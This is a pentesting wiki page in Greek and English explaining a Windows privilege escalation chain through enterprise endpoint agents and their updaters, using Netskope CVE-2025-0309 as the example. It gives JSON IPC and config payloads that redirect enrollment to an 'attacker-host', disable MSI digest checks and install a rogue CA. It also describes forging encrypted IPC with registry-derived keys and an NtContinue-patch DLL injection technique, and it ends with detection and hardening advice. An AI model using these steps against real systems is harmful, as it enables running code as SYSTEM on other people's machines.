# Κατάχρηση Enterprise Auto-Updaters και Privileged IPC (e.g., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα γενικεύει μια κλάση Windows local privilege escalation chains που βρέθηκαν σε enterprise endpoint agents και updaters που εκθέτουν μια low‑friction IPC surface και μια privileged update flow. Ένα αντιπροσωπευτικό παράδειγμα είναι Netskope Client for Windows < R129 (CVE-2025-0309), όπου ένας χρήστης με χαμηλά προνόμια μπορεί να εξαναγκάσει enrollment σε έναν attacker‑controlled server και στη συνέχεια να παραδώσει ένα κακόβουλο MSI που εγκαθιστά η υπηρεσία SYSTEM.

Key ideas you can reuse against similar products:
- Abuse a privileged service’s localhost IPC to force re‑enrollment or reconfiguration to an attacker server.
- Implement the vendor’s update endpoints, deliver a rogue Trusted Root CA, and point the updater to a malicious, “signed” package.
- Evade weak signer checks (CN allow‑lists), optional digest flags, and lax MSI properties.
- If IPC is “encrypted”, derive the key/IV from world‑readable machine identifiers stored in the registry.
- If the service restricts callers by image path/process name, inject into an allow‑listed process or spawn one suspended and bootstrap your DLL via a minimal thread‑context patch.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Many agents ship a user‑mode UI process that talks to a SYSTEM service over localhost TCP using JSON.

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Craft a JWT enrollment token whose claims control the backend host (e.g., AddonUrl). Use alg=None so no signature is required.
2) Send the IPC message invoking the provisioning command with your JWT and tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Η υπηρεσία αρχίζει να επικοινωνεί με τον rogue server σας για enrollment/config, π.χ.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Σημειώσεις:
- Εάν η caller verification είναι path/name‑based, προετοιμάστε το αίτημα ώστε να προέρχεται από ένα allow‑listed vendor binary (βλ. §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Μόλις ο client επικοινωνήσει με τον server σας, υλοποιήστε τα αναμενόμενα endpoints και κατευθύνετέ το σε ένα attacker MSI. Τυπική ακολουθία:

1) /v2/config/org/clientconfig → Επιστρέψτε JSON config με πολύ μικρό updater interval, π.χ.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. The service installs it into the Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Παράκαμψη κοινών ελέγχων που συναντώνται στο wild:
- Signer CN allow‑list: η υπηρεσία μπορεί να ελέγχει μόνο αν το Subject CN ισούται με “netSkope Inc” ή “Netskope, Inc.”. Το rogue CA σας μπορεί να εκδώσει ένα leaf με αυτό το CN και να υπογράψει το MSI.
- CERT_DIGEST property: συμπεριλάβετε ένα benign MSI property με όνομα CERT_DIGEST. Δεν εφαρμόζεται έλεγχος κατά την εγκατάσταση.
- Optional digest enforcement: flag στο config (π.χ., check_msi_digest=false) απενεργοποιεί την επιπλέον κρυπτογραφική επαλήθευση.

Αποτέλεσμα: η SYSTEM service εγκαθιστά το MSI σας από
C:\ProgramData\Netskope\stAgent\data\*.msi
εκτελώντας arbitrary code ως NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Από R127, η Netskope τύλιξε το IPC JSON σε ένα πεδίο encryptData που μοιάζει με Base64. Αντίστροφη μηχανική έδειξε AES με key/IV που παράγονται από registry τιμές αναγνώσιμες από οποιονδήποτε χρήστη:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Οι attackers μπορούν να αναπαράγουν την κρυπτογράφηση και να στείλουν έγκυρες encrypted εντολές από έναν standard user. Γενική συμβουλή: αν ένας agent ξαφνικά “κρυπτογραφεί” το IPC του, ψάξτε για device IDs, product GUIDs, install IDs κάτω από HKLM ως υλικό για κλειδιά.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Κάποιες υπηρεσίες προσπαθούν να αυθεντικοποιήσουν τον peer επιλύοντας το PID της TCP σύνδεσης και συγκρίνοντας το image path/name με allow‑listed vendor binaries που βρίσκονται κάτω από Program Files (π.χ., stagentui.exe, bwansvc.exe, epdlp.exe).

Δύο πρακτικές παρακάμψεις:
- DLL injection σε ένα allow‑listed process (π.χ., nsdiag.exe) και proxy IPC από μέσα του.
- Spawn ενός allow‑listed binary suspended και bootstrap της proxy DLL σας χωρίς CreateRemoteThread (βλ. §5) για να ικανοποιηθούν οι κανόνες tamper που εφαρμόζει ο driver.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Προϊόντα συχνά συνοδεύονται από έναν minifilter/OB callbacks driver (π.χ., Stadrv) που αφαιρεί επικίνδυνα δικαιώματα από handles προς protected processes:
- Process: αφαιρεί PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: περιορίζει σε THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ένας αξιόπιστος user‑mode loader που σέβεται αυτούς τους περιορισμούς:
1) CreateProcess ενός vendor binary με CREATE_SUSPENDED.
2) Αποκτήστε τα handles που εξακολουθείτε να έχετε δικαίωμα: PROCESS_VM_WRITE | PROCESS_VM_OPERATION για τη διαδικασία, και ένα thread handle με THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ή απλώς THREAD_RESUME αν κάνετε patch κώδικα σε γνωστό RIP).
3) Overwrite ntdll!NtContinue (ή άλλο αρχικό, εγγυημένα mapped thunk) με ένα μικρό stub που καλεί LoadLibraryW στο path της DLL σας, και μετά κάνει jump πίσω.
4) ResumeThread για να ενεργοποιηθεί το stub in‑process, φορτώνοντας την DLL σας.

Επειδή δεν χρησιμοποιήσατε ποτέ PROCESS_CREATE_THREAD ή PROCESS_SUSPEND_RESUME σε μια ήδη‑protected process (εσείς τη δημιουργήσατε), η πολιτική του driver ικανοποιείται.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) αυτοματοποιεί ένα rogue CA, malicious MSI signing, και εξυπηρετεί τα απαραίτητα endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope είναι ένας custom IPC client που κατασκευάζει arbitrary (optionally AES‑encrypted) IPC messages και περιλαμβάνει το suspended‑process injection για να προέρχονται από ένα allow‑listed binary.

---
## 7) Detection opportunities (blue team)
- Monitor προσθήκες στο Local Machine Trusted Root. Sysmon + registry‑mod eventing (βλ. SpecterOps guidance) δουλεύει καλά.
- Flag εκτελέσεις MSI που ξεκινούνται από την agent’s service από μονοπάτια όπως C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Ελέγξτε τα logs του agent για μη αναμενόμενα enrollment hosts/tenants, π.χ.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – ψάξτε για addonUrl / tenant anomalies και provisioning msg 148.
- Alert για localhost IPC clients που δεν είναι τα αναμενόμενα signed binaries, ή που προέρχονται από ασυνήθιστα child process trees.

---
## Hardening tips for vendors
- Bind enrollment/update hosts σε ένα αυστηρό allow‑list· reject untrusted domains στο clientcode.
- Authenticate IPC peers με OS primitives (ALPC security, named‑pipe SIDs) αντί για ελέγχους image path/name.
- Κρατήστε secret material εκτός world‑readable HKLM; αν το IPC πρέπει να είναι encrypted, παράξτε keys από protected secrets ή διαπραγματευτείτε μέσω authenticated channels.
- Θεωρήστε τον updater ως surface της supply‑chain: απαιτήστε πλήρη chain σε ένα trusted CA που ελέγχετε, verify package signatures έναντι pinned keys, και fail closed αν η επικύρωση είναι απενεργοποιημένη στο config.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
